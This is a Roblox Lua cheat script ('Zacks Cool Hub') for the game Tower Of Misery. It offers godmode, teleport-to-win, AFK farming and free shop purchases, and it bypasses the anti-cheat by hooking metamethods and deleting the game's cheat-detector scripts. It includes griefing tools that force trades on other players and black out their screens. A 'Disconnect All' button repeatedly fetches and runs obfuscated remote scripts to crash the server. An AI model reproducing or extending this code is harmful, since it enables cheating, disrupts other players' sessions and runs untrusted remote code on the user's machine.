local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Zacks Cool Hub | Tower Of Misery (Normal Mode)", HidePremium = true, IntroText = "Best Script For This Game!", SaveConfig = false, ConfigFolder = "ZCH (Normal Mode)"})
local Home = Window:MakeTab({
	Name = "Home",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local HomeSection = Home:AddSection({
	Name = "Home"
})
local Other = Window:MakeTab({
	Name = "Other",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local OtherSection = Other:AddSection({
	Name = "Other"
})
local Teleport = Window:MakeTab({
	Name = "Teleport",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local TeleportSection = Teleport:AddSection({
	Name = "Teleport"
})
local AntiCheat = Window:MakeTab({
	Name = "Anti Cheat",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local AntiCheatSection = AntiCheat:AddSection({
	Name = "Anti Cheat"
})
local Crashing = Window:MakeTab({
	Name = "Crashing",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local CrashingSection = Crashing:AddSection({
	Name = "Crashing"
})
local Fun = Window:MakeTab({
	Name = "Fun",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local FunSection = Fun:AddSection({
	Name = "Fun"
})

wait()
OrionLib:MakeNotification({
	Name = "Im Making More Scripts For Tower Games Check:",
	Content = "robloxscripts.com And My Username Is: zackiscool5, For More Of My Scripts",
	Image = "rbxassetid://4483345998",
	Time = 13
})
wait()
OrionLib:MakeNotification({
	Name = "REMINDER:",
	Content = "You need tools for the Bring Player script, you can get one by pressing: Gravity Coil (free) in Home",
	Image = "rbxassetid://4483345998",
	Time = 18
})
wait()
OrionLib:MakeNotification({
	Name = "Enjoy!",
	Content = "Zacks Cool Hub Is Running!",
	Image = "rbxassetid://4483345998",
	Time = 10
})
wait()
local cmdp = game:GetService("Players")
local cmdlp = game.Players.LocalPlayer

function findplr(args, tbl)
	if tbl == nil then
		local tbl = cmdp:GetPlayers()
		if args == "me" then
			return cmdlp
		elseif args == "random" then 
			return tbl[math.random(1,#tbl)]
		elseif args == "new" then
			local vAges = {} 
			for _,v in pairs(tbl) do
				if v.AccountAge < 30 and v ~= cmdlp then
					vAges[#vAges+1] = v
				end
			end
			return vAges[math.random(1,#vAges)]
		elseif args == "old" then
			local vAges = {} 
			for _,v in pairs(tbl) do
				if v.AccountAge > 30 and v ~= cmdlp then
					vAges[#vAges+1] = v
				end
			end
			return vAges[math.random(1,#vAges)]
		elseif args == "bacon" then
			local vAges = {} 
			for _,v in pairs(tbl) do
				if v.Character:FindFirstChild("Pal Hair") or v.Character:FindFirstChild("Kate Hair") and v ~= cmdlp then
					vAges[#vAges+1] = v
				end
			end
			return vAges[math.random(1,#vAges)]
		elseif args == "friend" then
			local vAges = {} 
			for _,v in pairs(tbl) do
				if v:IsFriendsWith(cmdlp.UserId) and v ~= cmdlp then
					vAges[#vAges+1] = v
				end
			end
			return vAges[math.random(1,#vAges)]
		elseif args == "notfriend" then
			local vAges = {} 
			for _,v in pairs(tbl) do
				if not v:IsFriendsWith(cmdlp.UserId) and v ~= cmdlp then
					vAges[#vAges+1] = v
				end
			end
			return vAges[math.random(1,#vAges)]
		elseif args == "ally" then
			local vAges = {} 
			for _,v in pairs(tbl) do
				if v.Team == cmdlp.Team and v ~= cmdlp then
					vAges[#vAges+1] = v
				end
			end
			return vAges[math.random(1,#vAges)]
		elseif args == "enemy" then
			local vAges = {} 
			for _,v in pairs(tbl) do
				if v.Team ~= cmdlp.Team then
					vAges[#vAges+1] = v
				end
			end
			return vAges[math.random(1,#vAges)]
		elseif args == "near" then
			local vAges = {} 
			for _,v in pairs(tbl) do
				if v ~= cmdlp then
					local math = (v.Character:FindFirstChild("HumanoidRootPart").Position - cmdlp.Character.HumanoidRootPart.Position).magnitude
					if math < 30 then
						vAges[#vAges+1] = v
					end
				end
			end
			return vAges[math.random(1,#vAges)]
		elseif args == "far" then
			local vAges = {} 
			for _,v in pairs(tbl) do
				if v ~= cmdlp then
					local math = (v.Character:FindFirstChild("HumanoidRootPart").Position - cmdlp.Character.HumanoidRootPart.Position).magnitude
					if math > 30 then
						vAges[#vAges+1] = v
					end
				end
			end
			return vAges[math.random(1,#vAges)]
		else 
			for _,v in pairs(tbl) do
				if v.Name:lower():find(args:lower()) or v.DisplayName:lower():find(args:lower()) then
					return v
				end
			end
		end
	else
		for _, plr in pairs(tbl) do
			if plr.UserName:lower():find(args:lower()) or plr.DisplayName:lower():find(args:lower()) then
				return plr
			end
		end
	end
end
wait()
Home:AddToggle({
Name = "Godmode",
Default = false,
Callback = function(god)
if god then
_G.godd = true
if _G.godd == true then
game:GetService("ReplicatedStorage"):FindFirstChild("Server_Data").ImmunityEnabled.Value = true
end
else
_G.godd = false
game:GetService("ReplicatedStorage"):FindFirstChild("Server_Data").ImmunityEnabled.Value = false
end
end})

Home:AddToggle({
Name = "Toggle Fly",
Default = false,
Callback = function(fly)
if fly then
_G.flyy = true
if _G.flyy == true then
loadstring(game:HttpGet("https://pastebin.com/raw/JLfCxegQ"))()
end
else
_G.flyy = false
game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.E,false,game)
end
end})

Home:AddButton({
Name = "Inf Yield",
Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end})

Home:AddButton({
Name = "Gravity Coil (free)",
Callback = function()
game:GetService("ReplicatedStorage"):FindFirstChild("Remote_Functions").General:FindFirstChild("Equip_Coil"):InvokeServer("Gravity Coil")
end})

Home:AddButton({
Name = "Save Location",
Callback = function()
while true do
wait()
local blah = (game.Players.LocalPlayer.Name)

      if game:GetService("Workspace")[blah].Humanoid.Health == 0 then
	   saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		local A_1 = game:GetService("Players").LocalPlayer

local Respawn = game:GetService("ReplicatedStorage").Remote_Functions.General.Respawn_Player
Respawn:InvokeServer(A_1)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
end
wait()
local blah = (game.Players.LocalPlayer.Name)

      if game:GetService("Workspace")[blah].Humanoid.Health == 0 then
	   saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		local A_1 = game:GetService("Players").LocalPlayer

local Respawn = game:GetService("ReplicatedStorage").Remote_Functions.General.Respawn_Player
Respawn:InvokeServer(A_1)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
end
wait()
local blah = (game.Players.LocalPlayer.Name)

      if game:GetService("Workspace")[blah].Humanoid.Health == 0 then
	   saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		local A_1 = game:GetService("Players").LocalPlayer

local Respawn = game:GetService("ReplicatedStorage").Remote_Functions.General.Respawn_Player
Respawn:InvokeServer(A_1)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
end
wait()
local blah = (game.Players.LocalPlayer.Name)

      if game:GetService("Workspace")[blah].Humanoid.Health == 0 then
	   saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		local A_1 = game:GetService("Players").LocalPlayer

local Respawn = game:GetService("ReplicatedStorage").Remote_Functions.General.Respawn_Player
Respawn:InvokeServer(A_1)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
end
end
wait(0.5)
OrionLib:MakeNotification({
	Name = "Done!",
	Content = "Saved Location",
	Image = "rbxassetid://4483345998",
	Time = 5
})
end})

Home:AddButton({
Name = "Respawn (quick) (DOES NOT ALWAYS WORK)",
Callback = function()
game.Players.LocalPlayer.Character.Head:Remove()
wait()
game:GetService("ReplicatedStorage").Remote_Functions.General.Respawn_Player:InvokeServer(game:GetService("Players").LocalPlayer)
end})

Other:AddSlider({
	Name = "(ANTI CHEAT FIRST) WalkSpeed",
	Min = 16,
	Max = 250,
	Default = 16,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "--WalkSpeed Here--",
	Callback = function(ws)
	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = ws
end})

Other:AddSlider({
	Name = "(ANTI CHEAT FIRST) JumpPower",
	Min = 50,
	Max = 350,
	Default = 50,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "--JumpPower Here--",
	Callback = function(jp)
	game.Players.LocalPlayer.Character.Humanoid.JumpPower = jp
end})

Other:AddSlider({
	Name = "(ANTI CHEAT FIRST) Gravity",
	Min = 3,
	Max = 200,
	Default = 194,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "--Gravity Here--",
	Callback = function(gr)
	game.Workspace.Gravity = gr
end})

Other:AddButton({
Name = "Normal Gravity",
Callback = function()
game.Workspace.Gravity = 194
end})

Other:AddButton({
Name = "Buy Everything",
Callback = function()
local args = {
    [1] = "QuickSpawn"
}

game:GetService("ReplicatedStorage").Remote_Functions.Shop.Purchase_Quick_Spawn:InvokeServer(unpack(args))
wait()
local args = {
    [1] = "HighSpeed"
}

game:GetService("ReplicatedStorage").Remote_Functions.Shop.Purchase_High_Speed:InvokeServer(unpack(args))
wait()
local args = {
    [1] = "LowGravity"
}

game:GetService("ReplicatedStorage").Remote_Functions.Shop.Purchase_Low_Gravity:InvokeServer(unpack(args))
wait()
local args = {
    [1] = "NightMode"
}

game:GetService("ReplicatedStorage").Remote_Functions.Shop.Purchase_Night_Mode:InvokeServer(unpack(args))
wait()
local args = {
    [1] = "GlassTower"
}

game:GetService("ReplicatedStorage").Remote_Functions.Shop.Purchase_Glass_Tower:InvokeServer(unpack(args))
wait()
local args = {
    [1] = "SpeedTimer"
}

game:GetService("ReplicatedStorage").Remote_Functions.Shop.Purchase_Speed_Timer:InvokeServer(unpack(args))
wait()
local args = {
    [1] = "Immunity"
}

game:GetService("ReplicatedStorage").Remote_Functions.Shop.Purchase_Immunity:InvokeServer(unpack(args))
wait(0.4)
OrionLib:MakeNotification({
	Name = "Done!",
	Content = "Auto Bought Everything!",
	Image = "rbxassetid://4483345998",
	Time = 5
})
end})

Teleport:AddButton({
Name = "Win (No Teleport)",
Callback = function()
for _,v in pairs(game:GetService("Workspace").TopSection.Hallway.RewardDoor:GetDescendants()) do
if v:IsA("TouchTransmitter") then
firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 0) --0 is touch
wait()
firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 1) -- 1 is untouch
end
end
end})

Teleport:AddButton({
Name = "TP To Top (win)",
Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-117.496094, 253.999847, 49.1546021)
end})

Teleport:AddToggle({
	Name = "AFK Farm",
	Default = false,
	Callback = function(afk)
	if afk then
    _G.afkf = true
    while _G.afkf == true do
    wait(0.1)
for _,v in pairs(game:GetService("Workspace").TopSection.Hallway.RewardDoor:GetDescendants()) do
if v:IsA("TouchTransmitter") then
firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart"), v.Parent, 0)
wait()
firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart"), v.Parent, 1)
end
if game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart") == nil or game.Players.LocalPlayer.Character:WaitForChild("Humanoid") == nil then
wait(0.6)
for _,v in pairs(game:GetService("Workspace").TopSection.Hallway.RewardDoor:GetDescendants()) do
if v:IsA("TouchTransmitter") then
firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart"), v.Parent, 0)
wait()
firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart"), v.Parent, 1)
end
end
end
wait()
game:GetService("ReplicatedStorage"):FindFirstChild("Server_Data").ImmunityEnabled.Value = true
wait()
local teleport_table = {
    location1 = Vector3.new(-117.496, 254, 49.1546, 1, 0, 0, 0, 1, 0, 0, 0, 1)
}

local tween_s = game:GetService("TweenService")
local tweeninfo = TweenInfo.new(0.2,Enum.EasingStyle.Linear)

local lp = game.Players.LocalPlayer

function tp(v)
    if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
        local cf = CFrame.new(v)
        local a = tween_s:Create(lp.Character.HumanoidRootPart, tweeninfo, {CFrame=cf})
        a:Play()
    end
end

tp(teleport_table.location1)
end
end
else
_G.afkf = false
end
end})

Teleport:AddButton({
Name = "TP To Winners Room",
Callback = function()
local playerHead = game.Players.LocalPlayer.Character.Head
for i, v in pairs(game:GetService("Workspace").TopSection.PortalTeleportationModel.PortalDoor:GetDescendants()) do
    if v.Name == "TouchInterest" and v.Parent then
        firetouchinterest(playerHead, v.Parent, 0)
        wait(0.1)
        firetouchinterest(playerHead, v.Parent, 1)
        break
        end
    end
end})

Teleport:AddButton({
Name = "Flappy Bird (winners room)",
Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-56.890461, 234.499954, 2806.3042)
end})

Teleport:AddButton({
Name = "Track Slide (winners room)",
Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-53.7034874, 234.09996, 2822.60352)
end})

Teleport:AddButton({
Name = "TP To Roof",
Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-20.8377876, 277.999878, 48.8636551)
end})

Teleport:AddButton({
Name = "Teleport (tween/bypass) (auto godmode)",
Callback = function()
game:GetService("ReplicatedStorage"):FindFirstChild("Server_Data").ImmunityEnabled.Value = true
wait()
local teleport_table = {
    location1 = Vector3.new(-117.496, 254, 49.1546, 1, 0, 0, 0, 1, 0, 0, 0, 1)
}

local tween_s = game:GetService("TweenService")
local tweeninfo = TweenInfo.new(0.2,Enum.EasingStyle.Linear)

local lp = game.Players.LocalPlayer

function tp(v)
    if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
        local cf = CFrame.new(v)
        local a = tween_s:Create(lp.Character.HumanoidRootPart, tweeninfo, {CFrame=cf})
        a:Play()
    end
end

tp(teleport_table.location1)
end})

Teleport:AddButton({
Name = "Fully Leave Winners Room (Removes Sword To)",
Callback = function()
local playerHead = game.Players.LocalPlayer.Character.Head
for i, v in pairs(game:GetService("Workspace").PortalTeleportationModel2.TeleportationPart2:GetDescendants()) do
    if v.Name == "TouchInterest" and v.Parent then
        firetouchinterest(playerHead, v.Parent, 0)
        wait(0.1)
        firetouchinterest(playerHead, v.Parent, 1)
        break
        end
    end
end})

AntiCheat:AddButton({
Name = "Anti Cheat Bypass (kick method)",
Callback = function()
local mt = getrawmetatable(game)
make_writeable(mt)

local namecall = mt.__namecall

mt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    
    if method == "InvokeServer" and tostring(self) == "CallFunction" then
        return warn("Tried To Call")
    end
    return namecall(self, table.unpack(args))
end)
end})

AntiCheat:AddButton({
Name = "Anti Cheat Bypass (USE THIS TO)",
Callback = function()
	game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
	Text = "PRESS ON RESPAWN AND EVERY ROUND FOR BYPASSED ANTI CHEAT (NOT KICK METHOD BUT EVERYTHING ELSE)",
    Color = Color3.fromRGB(124, 92, 70)
	})
game.Players.LocalPlayer.Character:FindFirstChild("Property Signals"):Destroy()
wait()
game.Players.LocalPlayer.Character:FindFirstChild("Event Handler"):Destroy()
wait()
-- start parenting stuff to different/random places then removing them (SIMPLE)
game.Players.LocalPlayer.Character:FindFirstChild("Cheat Detector"):FindFirstChild("Security Lock").Parent = game:GetService("MarketplaceService")
wait()
game.MarketplaceService:FindFirstChild("Security Lock"):Destroy()
wait()
game.Players.LocalPlayer.Character:FindFirstChild("Cheat Detector"):FindFirstChild("Regular Checks").Parent = game:GetService("SoundService")
wait()
game.SoundService:FindFirstChild("Regular Checks"):Destroy()
wait()
game.Players.LocalPlayer.Character:FindFirstChild("Cheat Detector"):FindFirstChild("Change Signals").Parent = game:GetService("ReplicatedFirst")
wait()
game.ReplicatedFirst:FindFirstChild("Change Signals"):Destroy()
wait()
game.Players.LocalPlayer.Character:FindFirstChild("Cheat Detector"):FindFirstChild("Event Handler").Parent = game:GetService("PolicyService")
wait()
game.PolicyService:FindFirstChild("Event Handler"):Destroy()
wait()
game.Players.LocalPlayer.Character:FindFirstChild("Cheat Detector").Parent = game:GetService("LogService")
wait()
game.LogService:FindFirstChild("Cheat Detector"):Destroy()
end})

Fun:AddButton({
Name = "Break Everyones Screens (FIXED)",
Callback = function()
for i, v in pairs(game:GetService("Players"):GetChildren()) do
local args = {
    [1] = v
}
game:GetService("ReplicatedStorage"):FindFirstChild("Crate_System_V2"):FindFirstChild("Remote_Events"):FindFirstChild("Accept_Trade_Request"):FireServer(unpack(args))
wait()
local args = {
    [1] = v
}
game:GetService("ReplicatedStorage"):FindFirstChild("Crate_System_V2"):FindFirstChild("Remote_Events"):FindFirstChild("Accept_Trade_Request"):FireServer(unpack(args))
end
end})

Fun:AddButton({
Name = "Remove Black Screen (doesn't work for disconnect all)",
Callback = function()
game:GetService("ReplicatedStorage").Crate_System_V2.Remote_Events.Decline_Trade:FireServer()
wait()
game:GetService("ReplicatedStorage").Crate_System_V2.Remote_Events.Decline_Trade:FireServer()
wait()
game:GetService("ReplicatedStorage").Crate_System_V2.Remote_Events.Decline_Trade:FireServer()
wait()
game:GetService("ReplicatedStorage").Crate_System_V2.Remote_Events.Decline_Trade:FireServer()
wait()
game:GetService("ReplicatedStorage").Crate_System_V2.Remote_Events.Decline_Trade:FireServer()
wait()
game:GetService("ReplicatedStorage").Crate_System_V2.Remote_Events.Decline_Trade:FireServer()
end})

Fun:AddButton({
Name = "(CLIENT SIDE) Night Mode",
Callback = function()
game:GetService("Lighting").ClockTime = 0
end})

Fun:AddButton({
Name = "Reset Lighting",
Callback = function()
game:GetService("Lighting").ClockTime = 14
end})

Other:AddButton({
Name = "Get Sword",
Callback = function()
local playerHead = game.Players.LocalPlayer.Character.Head
for i, v in pairs(game:GetService("Workspace").TopSection.PortalTeleportationModel.PortalDoor:GetDescendants()) do
    if v.Name == "TouchInterest" and v.Parent then
        firetouchinterest(playerHead, v.Parent, 0)
        wait(0.1)
        firetouchinterest(playerHead, v.Parent, 1)
        break
        end
end
wait(0.5)
fireclickdetector(game:GetService("Workspace").WinnersRoomServerSide.SwordGiver.ClickPart.ClickDetector)
wait(0.4)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-117.496094, 253.999847, 49.1546021)
end})

Crashing:AddButton({
Name = "Disconnect All (3-4 min)",
Callback = function()
OrionLib:MakeNotification({
	Name = "ACTIVATED!",
	Content = "THIS WILL LAG AND DISCONNECT THE SERVER (not really recommended on free exploits much)",
	Image = "rbxassetid://4483345998",
	Time = 13
})
_G.dissss = true
while _G.dissss == true do
wait()
loadstring(game:HttpGet('https://raw.githubusercontent.com/dudeididntliterally/owihgfrwpoghwortu/main/asijofgwrf.lua'))()
wait()
loadstring(game:HttpGet('https://raw.githubusercontent.com/dudeididntliterally/owihgfrwpoghwortu/main/wkjfrgewer.lua'))()
wait()
loadstring(game:HttpGet('https://raw.githubusercontent.com/dudeididntliterally/owihgfrwpoghwortu/main/asijofgwrf.lua'))()
wait()
loadstring(game:HttpGet('https://raw.githubusercontent.com/dudeididntliterally/owihgfrwpoghwortu/main/wkjfrgewer.lua'))()
wait()
loadstring(game:HttpGet('https://raw.githubusercontent.com/dudeididntliterally/owihgfrwpoghwortu/main/asijofgwrf.lua'))()
wait()
loadstring(game:HttpGet('https://raw.githubusercontent.com/dudeididntliterally/owihgfrwpoghwortu/main/wkjfrgewer.lua'))()
wait()
loadstring(game:HttpGet('https://raw.githubusercontent.com/dudeididntliterally/owihgfrwpoghwortu/main/asijofgwrf.lua'))()
wait()
loadstring(game:HttpGet('https://raw.githubusercontent.com/dudeididntliterally/owihgfrwpoghwortu/main/wkjfrgewer.lua'))()
end
end})

Crashing:AddButton({
Name = "Rejoin",
Callback = function()
    local TeleportService = game:GetService("TeleportService")
		TeleportService:Teleport(game.PlaceId, game.Players.LocalPlayer)
		wait()
		TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
end})

Fun:AddTextbox({
Name = "Force Trade Player",
Default = "Username Or Display",
TextDisappear = true,
Callback = function(oklll)
local target = findplr(oklll)
local args = {
    [1] = target
}
game:GetService("ReplicatedStorage"):FindFirstChild("Crate_System_V2"):FindFirstChild("Remote_Events"):FindFirstChild("Accept_Trade_Request"):FireServer(unpack(args))
end})

Fun:AddButton({
Name = "Anti Bring/Kill (other exploiters and tools)",
Callback = function()
				local char = game.Players.LocalPlayer.Character
				char.Parent = nil
				char.HumanoidRootPart:Destroy()
				char.Parent = workspace
				wait(0.1)
				game:GetService("Workspace").FallenPartsDestroyHeight = math.huge-math.huge
				local val = Instance.new("Part")
				val.Parent = game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool")
				val.Name = "valid"
				wait(0.1)
				game.Players.LocalPlayer.Character.ChildAdded:Connect(function(newtool)
					if not newtool:FindFirstChild("valid") then
						newtool:Destroy()
					end
					end)
end})

Fun:AddButton({
Name = "Glitch Server Effects (free) (wait 3)",
Callback = function()
local playerHead = game.Players.LocalPlayer.Character.Head
for i, v in pairs(game:GetService("Workspace").TopSection.PortalTeleportationModel.PortalDoor:GetDescendants()) do
    if v.Name == "TouchInterest" and v.Parent then
        firetouchinterest(playerHead, v.Parent, 0)
        wait(0.1)
        firetouchinterest(playerHead, v.Parent, 1)
        break
    end
end
wait(0.7)
fireclickdetector(game:GetService("Workspace").WinnersRoom["Control Panel"]["Quick_Spawn"].ClickDetector)
wait()
fireclickdetector(game:GetService("Workspace").WinnersRoom["Control Panel"]["High_Speed"].ClickDetector)
wait()
fireclickdetector(game:GetService("Workspace").WinnersRoom["Control Panel"]["Low_Gravity"].ClickDetector)
wait()
fireclickdetector(game:GetService("Workspace").WinnersRoom["Control Panel"]["Night_Mode"].ClickDetector)
wait()
fireclickdetector(game:GetService("Workspace").WinnersRoom["Control Panel"]["Glass_Tower"].ClickDetector)
wait()
fireclickdetector(game:GetService("Workspace").WinnersRoom["Control Panel"]["Immunity"].ClickDetector)
wait()
fireclickdetector(game:GetService("Workspace").WinnersRoom["Control Panel"]["Speed_Coil"].ClickDetector)
wait()
fireclickdetector(game:GetService("Workspace").WinnersRoom["Control Panel"]["Gravity_Coil"].ClickDetector)
wait(1)
local playerHead = game.Players.LocalPlayer.Character.Head
for i, v in pairs(game:GetService("Workspace").WinnersRoom["WR_Practice_Stage_Teleport"]:GetDescendants()) do
    if v.Name == "TouchInterest" and v.Parent then
        firetouchinterest(playerHead, v.Parent, 0)
        wait(0.1)
        firetouchinterest(playerHead, v.Parent, 1)
        break
    end
end
wait(1)
local playerHead = game.Players.LocalPlayer.Character.Head
for i, v in pairs(game:GetService("Workspace").PortalTeleportationModel2.TeleportationPart2:GetDescendants()) do
    if v.Name == "TouchInterest" and v.Parent then
        firetouchinterest(playerHead, v.Parent, 0)
        wait(0.1)
        firetouchinterest(playerHead, v.Parent, 1)
        break
    end
end
end})

Fun:AddButton({
Name = "Fix Glitch Server Effects",
Callback = function()
local playerHead = game.Players.LocalPlayer.Character.Head
for i, v in pairs(game:GetService("Workspace").TopSection.PortalTeleportationModel.PortalDoor:GetDescendants()) do
    if v.Name == "TouchInterest" and v.Parent then
        firetouchinterest(playerHead, v.Parent, 0)
        wait(0.1)
        firetouchinterest(playerHead, v.Parent, 1)
        break
    end
end
wait(0.8)
fireclickdetector(game:GetService("Workspace").WinnersRoom["Control Panel"]["Quick_Spawn"].ClickDetector)
wait()
fireclickdetector(game:GetService("Workspace").WinnersRoom["Control Panel"]["High_Speed"].ClickDetector)
wait()
fireclickdetector(game:GetService("Workspace").WinnersRoom["Control Panel"]["Low_Gravity"].ClickDetector)
wait()
fireclickdetector(game:GetService("Workspace").WinnersRoom["Control Panel"]["Night_Mode"].ClickDetector)
wait()
fireclickdetector(game:GetService("Workspace").WinnersRoom["Control Panel"]["Glass_Tower"].ClickDetector)
wait()
fireclickdetector(game:GetService("Workspace").WinnersRoom["Control Panel"]["Immunity"].ClickDetector)
wait()
fireclickdetector(game:GetService("Workspace").WinnersRoom["Control Panel"]["Speed_Coil"].ClickDetector)
wait()
fireclickdetector(game:GetService("Workspace").WinnersRoom["Control Panel"]["Gravity_Coil"].ClickDetector)
wait(0.8)
local playerHead = game.Players.LocalPlayer.Character.Head
for i, v in pairs(game:GetService("Workspace").WinnersRoom["WR_Lobby"]["WR_Respawn"]:GetDescendants()) do
    if v.Name == "TouchInterest" and v.Parent then
        firetouchinterest(playerHead, v.Parent, 0)
        wait(0.1)
        firetouchinterest(playerHead, v.Parent, 1)
        break
    end
end
wait(0.6)
local playerHead = game.Players.LocalPlayer.Character.Head
for i, v in pairs(game:GetService("Workspace").PortalTeleportationModel2.TeleportationPart2:GetDescendants()) do
    if v.Name == "TouchInterest" and v.Parent then
        firetouchinterest(playerHead, v.Parent, 0)
        wait(0.1)
        firetouchinterest(playerHead, v.Parent, 1)
        break
    end
end
end})

Fun:AddTextbox({
Name = "(TOOL) Bring Player (FE Sorta Bring)",
Default = "Username Or Display",
TextDisappear = true,
Callback = function(bring)
	local target = findplr(bring)
	cmdlp.Character.Humanoid.Name = 1
	local l = cmdlp.Character["1"]:Clone()
	l.Parent = cmdlp.Character
	l.Name = "Humanoid"
	wait(.2)
	cmdlp.Character["1"]:Destroy()
	workspace.CurrentCamera.CameraSubject = cmdlp.Character
	cmdlp.Character.Humanoid.DisplayDistanceType = "None"
	cmdlp.Character.Humanoid:UnequipTools()
	local v = cmdlp.Backpack:FindFirstChildOfClass("Tool")
	v.Parent = cmdlp.Character
	v.Parent = cmdlp.Character.HumanoidRootPart
	firetouchinterest(target.Character.HumanoidRootPart, v.Handle, 0)
	firetouchinterest(target.Character.HumanoidRootPart, v.Handle, 1)
	pcall(function() cmdlp.Character.HumanoidRootPart.CFrame = NormPos end)
	wait(.3)
	cmdlp.Character:Remove()
	cmdlp.CharacterAdded:Wait()
end})

Fun:AddButton({
Name = "Auto Collect Beyblades (loop)",
Callback = function()
while wait() do
   pcall(function()
   for i,v in pairs(game.Workspace.Itens:GetDescendants()) do
   if string.find(v.Name, "Top") then
       firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v, 0)
firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v, 1)
   end
   end
   end)
   end
end})

Fun:AddButton({
Name = "Auto Collect Gems (loop)",
Callback = function()
while wait() do
   pcall(function()
   for i,v in pairs(game.Workspace.Tower:GetDescendants()) do
   if string.find(v.Name, "Emerald") then
       firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v, 0)
firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v, 1)
   end
   end
   end)
   end
end})
